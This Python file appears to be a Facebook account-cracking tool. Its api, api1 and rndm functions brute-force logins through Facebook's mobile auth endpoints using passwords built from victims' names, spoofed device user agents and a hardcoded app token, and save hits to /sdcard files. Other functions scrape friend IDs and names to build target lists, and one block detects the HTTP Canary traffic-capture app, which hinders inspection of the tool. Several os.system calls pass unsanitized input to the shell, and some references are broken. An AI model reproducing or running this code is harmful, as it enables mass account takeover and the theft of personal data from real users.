xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RAJA~] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/'+'{density=3.5,width=1440,height=2730};'+f'FBLC/en_US;FBRV/253980635;FBCR/Spark NZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;37m [RAJA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAJA~OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m [RAJA~CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAJA~CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RAJA~] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/'+'{density=3.5,width=1440,height=2730};'+f'FBLC/en_US;FBRV/253980635;FBCR/Spark NZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RAJA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAJA~OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m [RAJA~CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAJA~CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/RAJA~CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RAJA~] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/'+'{density=3.5,width=1440,height=2730};'+f'FBLC/en_US;FBRV/253980635;FBCR/Spark NZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/RAJA~OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [RAJA-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/RAJA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [RAJA-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAJA~OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue

                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass                        
def create_file():
	os.system('clear')
	print(logo)
	print('\033[1;32m [1] Create File ')
	print(' [2] Remove Doubleg link ')
	print(' [3] Seprate link ')
	print(' [0] Exit')
	print(50*'-')
	create_ = input(' Select : ')
	if create_ == "1":
		create_file_login()
	elif create_ == "2":
		double()
	elif create_ == "3":
		sep()
	elif create_ == "0":
		menu()
	else:
		exit('invalid select')
	mycrackistan()	
 
def create_file_login():
	ids = []
	total = []
	xyz = requests.Session()
	os.system('clear')
	print(logo)
	try:
		cok = open('fb_cookies.txt','r').read()
		cookies = {'cookie':cok}
		access_token = open('access_token.txt', 'r').read()
	except FileNotFoundError:
		login()
	try:
		check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
		load = json.loads(check_cookies)
		iid = load['id']
		name = load['name']
	except KeyError:
		print('\n Cookies has expired')
		time.sleep(1)
		os.system('rm -rf .fb_cookies.txt .access_token.txt')
		login()
	except requests.exceptions.ConnectionError:
		print(' No internet connection ...')
	os.system('clear')
	print(logo)
	print("[1] Create File Mix Ids")
	print("[2] Create File New Ids")
	print(44*"-")
	typp = input('select : ')
	if xd in ['1','01']:
		auto_file(cookies,access_token)
	elif xd in ['2','02']:
		new_file(cookies,access_token)
	else:
		auto_file(cookies,access_token)
 
def auto_file(cookies,access_token):
	global total
	os.system('clear & rm -rf .txt .temp.txt')
	os.system('clear')
	print(logo)
	try:
		fl = 1
	except:
		fl = 1
	for xd in range(fl):
		idt = input(f' Put id {xd+1}: ')
		try:
			fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
			xyz = requests.Session()
			r = xyz.get(fd_url,cookies=cookies).text
			q = json.loads(r)
			for iid in q['friends']['data']:
				uid = iid['id']
				open('.txt','a').write(uid+'\n')
		except KeyError:
			print(' No Friend List : '+idt)
			time.sleep(3)
			return auto_file(cookies,access_token)
		except requests.exceptions.ConnectionError:
			print(' No internet connection ....')
	sid = "1"
	os.system('cat .txt | grep "'+sid+'" > .temp.txt')
	file = open('.temp.txt','r').read().splitlines()
	print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
	#100010138361148
	sf = input(' Saved File As : ')
	print('')
	os.system('clear')
	print(logo)
	print(' Total ids To Dump: '+str(len(file)))
	print(' Dumping Is Started Wait ....')
	print(50*'-')
	with ThreadPool(max_workers=20) as yaari:
		for exid in file:
			yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
	print(' Total ids Extracted : '+str(len(total)))
	input(' Press enter to back ')
	menu()
 
def new_file(cookies,access_token):
	global total
	os.system('clear & rm -rf .txt .temp.txt')
	os.system('clear')
	print(logo)
	try:
		fl = 1
	except:
		fl = 1
	for xd in range(fl):
		idt = input(f' Put id {xd+1}: ')
		try:
			fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
			xyz = requests.Session()
			r = xyz.get(fd_url,cookies=cookies).text
			q = json.loads(r)
			for iid in q['friends']['data']:
				uid = iid['id']
				open('.txt','a').write(uid+'\n')
		except KeyError:
			print(' No Friend List : '+idt)
			time.sleep(3)
			return auto_file(cookies,access_token)
		except requests.exceptions.ConnectionError:
			print(' No internet connection ....')
	print('\n\033[1;92m Example: 100087,100088 etc\033[0;97m')
	try:
		sl = int(input('\n How Many Links To Grab : '))
	except:
		sl = 1
	for el in range(sl):
		sid = input(f' Put {el+1} link: ')
		os.system('cat .txt | grep "'+sid+'" > .temp.txt')
	file = open('.temp.txt','r').read().splitlines()
	print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
	#100010138361148
	sf = input(' Saved File As : ')
	print('')
	os.system('clear')
	print(logo)
	print(' Total ids To Dump: '+str(len(file)))
	print(' Dumping Is Started Wait ....')
	print(50*'-')
	with ThreadPool(max_workers=20) as yaari:
		for exid in file:
			yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
	try:
		son = f"qaiser{str(random.randint(0,90))}.txt"
	except:
		son = f"qaiser{str(random.randint(10,50))}.txt"
	os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+son+'')
	print(' Total ids Extracted : '+str(len(total)))
	print(' New ids Saved As : /sdcard/'+son)
	print(' Normal ids Saved As : '+sf)
	input(' Press enter to back ')
	menu()
 
def iamBadBoy(exid,cookies,access_token,sf):
	try:
		global total,loop
		fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
		xyz = requests.Session()
		r = xyz.get(fd_url,cookies=cookies).text
		q = json.loads(r)
		for yaad in q['friends']['data']:
			iid = yaad['id']
			name = yaad['name']
			total.append(iid)
			open(sf,'a').write(iid+'|'+name+'\n')
		loop+=1
		sys.stdout.write('\r Dumping Ids [%s] : [%s]\r'%(loop,len(total)));sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		print(' No internet connection ...')
	except Exception as e:
		pass
		#print(e)
	except KeyError:
		pass
 
def sep():
	os.system('clear');print(logo)
	try:
		limit = int(input('\033[1;92m How many links do you want to separate ? '))
	except:
		limit = 1
	print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
	file_name = input('\033[0m Input file path : ')
	print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
	new_save = input('\033[0m Save new file as : ')
	y = 0
	print(f"{ro} Ids To Grabb Ex [ 100087,100088,100089 etc.. ]{s}")
	for k in range(limit):
		y+=1
		links=input(' Put Uid Type : ')
		os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
	print(44*"\033[0m-")
	print(f'{rc} ids grabbed successfully{s}')
	print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
	print('\033[0m New file saved as : \033[0;33m '+new_save)
	print(44*"\033[0m-")
	input('\033[0m[Press enter to back] ')
	menu()
 
def sep():
	os.system('clear');print(logo)
	try:
		limit = int(input('\033[1;92m How many links do you want to separate ? '))
	except:
		limit = 1
	print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
	file_name = input('\033[0m Input file path : ')
	print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
	new_save = input('\033[0m Save new file as : ')
	y = 0
	print(f"{ro} link To Grabb Ex [ 100087,100088,100089 etc.. ]{s}")
	for k in range(limit):
		y+=1
		links=input(' Put Uid Type : ')
		os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
	print(44*"\033[0m-")
	print(f'{rc} ids grabbed successfully{s}')
	print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
	print('\033[0m New file saved as : \033[0;33m '+new_save)
	print(44*"\033[0m-")
	input('\033[0m[Press enter to back] ')
	nenu()
	
def double():
	os.system('clear')
	print(logo)
	user_file = input('File Path : ')
	try:
		open(user_file,'r').read()
		print(' \n\033[1;97mExample: /sdcard/xxx.txt\n\033[0;97m')
		save_file = input('Save new file as: ')
		os.system('touch '+save_file)
		os.system('sort -r '+user_file+' | uniq > '+save_file)
		print(50*'-')
		print(' Fully Removed Multi Lines Ids')
		print(' Dublicate Lines Removed From File')
		print(' File Saved As : '+save_file)
		print(50*'-')
		input('Press enter to back ')
		nenu()
	except FileNotFoundError:
		print(' Invalid File ')
 
#----[http-capture]----
try:
	a = "anar"
	t="tt"
	fileee = os.listdir('/sdcard/Android/data/')
	if f'com.h{t}pc{a}y.pro' in fileee:
		print('error occur 0')
		#exit()
		#exit(f'\nsomethiiing went wrong\n\nContact Admin : +919149858868')
except Exception as e:
	print(e)
	pass
except PermissionError:
	pass
	
if not os.path.exists('.fam'):
	menu()
else:
	menu()
